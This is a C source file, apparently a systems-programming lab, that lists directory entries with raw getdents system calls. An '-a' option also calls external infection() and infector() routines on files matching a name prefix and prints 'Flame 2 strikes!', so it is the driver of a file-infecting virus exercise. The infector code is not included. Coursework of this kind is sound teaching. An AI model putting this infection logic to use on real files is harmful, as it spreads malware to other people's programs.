
/*
 * List directories using getdents() because ls, find and Python libraries
 * use readdir() which is slower (but uses getdents() underneath.
 *
 * Compile with 
 * ]$ gcc  getdents.c -o getdents
 */
#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <fcntl.h>
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_LSEEK 19
#define STDOUT 1
#define O_RDRW 0x002
#define S_IRWXU 0x0777
#define SEEK_SET 0
#define SYS_CLOSE 6
#define SYS_READ 3
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define O_RDONLY 0x000
#define SYS_EXIT 1
#include "util.h"

extern void code_start();
extern void code_end();

  struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                                 /* length is actually (d_reclen - 2 -
                                    offsetof(struct linux_dirent, d_name)) */
               /*
               char           pad;       // Zero padding byte
               char           d_type;    // File type (only since Linux
                                         // 2.6.4); offset is (d_reclen - 1)
               */
};

#define BUF_SIZE 8192

int
main(int argc, char *argv[])
{
    char *comment="Flame 2 strikes!";
    system_call(SYS_WRITE, STDOUT, comment, strlen(comment) );
    system_call(SYS_WRITE, 1,"\n", 1);
    int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;
    char *name;
    char *d_type;
    char *type;
    int i=0, debug=0, return_value, return_vtype, p=0, a=0, normal=1, argv1=0;

    while (i<argc) {
        if (strcmp(argv[i], "-D") == 0) {
            debug=1;
        }
         if (strncmp(argv[i], "-a", 2) == 0) {
            a=1;
            normal=0;
            argv1=i;
        }
          if (strncmp(argv[i], "-p", 2) == 0) {
            p=1;
            normal=0;
            argv1=i;
        }
        i++;
    }

     void debug1(struct linux_dirent *dir, int rvalue, int tvalue){
            system_call(SYS_WRITE, STDOUT, "Debug!! " , 9 );
            system_call(SYS_WRITE, STDOUT, "\n",1);
        
            system_call(SYS_WRITE, STDOUT, "file length: " , 12 );
          system_call(SYS_WRITE,STDOUT,itoa(dir-> d_reclen),strlen(itoa(dir-> d_reclen)));
          system_call(SYS_WRITE, STDOUT, "\n",1);
         system_call(SYS_WRITE, STDOUT, "System call: " , 14 );
        system_call(SYS_WRITE, STDOUT, "\n",1);
         system_call(SYS_WRITE,STDOUT, "STDOUT : ", 8);
    
        system_call(SYS_WRITE,STDOUT, "return value : ", 15);
         system_call(SYS_WRITE,STDOUT, itoa(rvalue), strlen(itoa(rvalue)));
          system_call(SYS_WRITE, STDOUT, "\n",1);
          system_call(SYS_WRITE, STDOUT, "System call: " , 14 );
            system_call(SYS_WRITE, STDOUT, "\n",1);
         system_call(SYS_WRITE,STDOUT, "STDOUT : ", 8);
        system_call(SYS_WRITE,STDOUT, "number of syscall : ", 18);
        system_call(SYS_WRITE,STDOUT, itoa(STDOUT), strlen(itoa(STDOUT)));
        system_call(SYS_WRITE, STDOUT, "\n",1);
        system_call(SYS_WRITE,STDOUT, "return value : ", 15);
         system_call(SYS_WRITE,STDOUT, itoa(tvalue), strlen(itoa(tvalue)));
          system_call(SYS_WRITE, STDOUT, "\n",1);
          system_call(SYS_WRITE, STDOUT, "\n",1);
     }

    fd= system_call(SYS_OPEN, ".", O_RDONLY);

    if(debug){
        system_call(SYS_WRITE, STDOUT, "System call: " , 14 );
        system_call(SYS_WRITE, STDOUT, "SYSOPEN" , 7 );
        system_call(SYS_WRITE, STDOUT, "\n",1);
        system_call(SYS_WRITE,STDOUT, "number of syscall : ", 18);
        system_call(SYS_WRITE,STDOUT, itoa(6), strlen(itoa(6)));
        system_call(SYS_WRITE, STDOUT, "\n",1);  
        system_call(SYS_WRITE,STDOUT, "return value : ", 15);
         system_call(SYS_WRITE,STDOUT, itoa(fd), strlen(itoa(fd)));
        system_call(SYS_WRITE, STDOUT, "\n",1);
        system_call(SYS_WRITE, STDOUT, "\n",1);
    } 

    if (fd == -1){
        system_call(SYS_EXIT, 0x55,0,0);
    }

        nread= system_call(141, fd,  buf, BUF_SIZE);
           if(debug){
             system_call(SYS_WRITE, STDOUT, "System call: " , 14 );
        system_call(SYS_WRITE, STDOUT, "SYSGETDENTS" , 10 );
        system_call(SYS_WRITE, STDOUT, "\n",1);
        system_call(SYS_WRITE,STDOUT, "number of syscall : ", 18);
        system_call(SYS_WRITE,STDOUT, itoa(141), strlen(itoa(141)));
        system_call(SYS_WRITE, STDOUT, "\n",1);  
        system_call(SYS_WRITE,STDOUT, "return value : ", 15);
         system_call(SYS_WRITE,STDOUT, itoa(nread), strlen(itoa(nread)));
        system_call(SYS_WRITE, STDOUT, "\n",1);
        system_call(SYS_WRITE, STDOUT, "\n",1);
           } 

        if (nread == -1){
            system_call(SYS_EXIT, 0x55,0,0);
        }

        if (nread == 0){
            system_call(SYS_EXIT, 0x55,0,0);
        }

        if(a){
            name=argv[1]+2;
            infection(); 
            system_call(SYS_WRITE, STDOUT, name ,strlen(name)); 
            infector(name);
            system_call(SYS_WRITE, STDOUT,"\n", 1);
            system_call(SYS_WRITE, STDOUT, itoa(code_start), strlen(itoa(code_start)));
            system_call(SYS_WRITE, STDOUT,"\n", 1);
            system_call(SYS_WRITE, STDOUT, itoa(code_end) , strlen(itoa(code_end)));
            system_call(SYS_WRITE, STDOUT ,"\n", 1);
        }

        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) (buf + bpos);
            d_type = *(buf + bpos + d->d_reclen - 1);
            if(d_type==DT_REG)
               type="regular";
            else if((d_type == DT_DIR))
                type="directory";
            else if (d_type == DT_FIFO)
                 type="FIFO";
            else if(d_type== DT_SOCK)
                 type="socket";
            else if(d_type==DT_LNK)
                type="symlink";
            else if(d_type==DT_BLK)
                type="block dev";
            else if(d_type==DT_CHR)
                 type="char dev";                      
            if( d->d_ino != 0 ) {
                if(p){
                    name=argv[argv1]+2;
                   if(strncmp(name, (char *)d->d_name, strlen(name))==0){
                        system_call(SYS_WRITE, STDOUT, "file name :" , 13 );
                       return_value=system_call(SYS_WRITE, STDOUT, (char *)d->d_name , strlen((char *)d->d_name ));
                       system_call(SYS_WRITE, STDOUT,"\n", 1);
                       return_vtype=system_call(SYS_WRITE, STDOUT, type , strlen(type));
                       system_call(SYS_WRITE, STDOUT ,"\n", 1);
                        if (debug){
                          debug1(d, return_value, return_vtype); 
                       }
                   }
           
                }

                else if(normal){
                    system_call(SYS_WRITE, STDOUT, "file name :" , 13 );
                    return_value=system_call(SYS_WRITE, 1, (char *)d->d_name , strlen((char *)d->d_name ));
                    system_call(SYS_WRITE, 1,"\n", 1);
                     return_vtype=system_call(SYS_WRITE, STDOUT, type , strlen(type));
                       system_call(SYS_WRITE, STDOUT ,"\n", 1);
                    if (debug){
                    debug1(d, return_value, return_vtype); 
                    }
                  
                }
                else if(a){ 
                      name=argv[argv1]+2;
                      if(strncmp(name, (char *)d->d_name, strlen(name))==0){
                        system_call(SYS_WRITE, STDOUT, "file name :" , 13 );
                       return_value=system_call(SYS_WRITE, STDOUT, (char *)d->d_name , strlen((char *)d->d_name ));
                       infector((char *)d->d_name );
                       system_call(SYS_WRITE, STDOUT,"\n", 1);
                       return_vtype=system_call(SYS_WRITE, STDOUT, type , strlen(type));
                       system_call(SYS_WRITE, STDOUT ,"\n", 1);
                       if (debug){
                          debug1(d, return_value, return_vtype); 
                       }
                   }
                
                }            
            }
            bpos += d->d_reclen;
        }
        
    return 0;
}


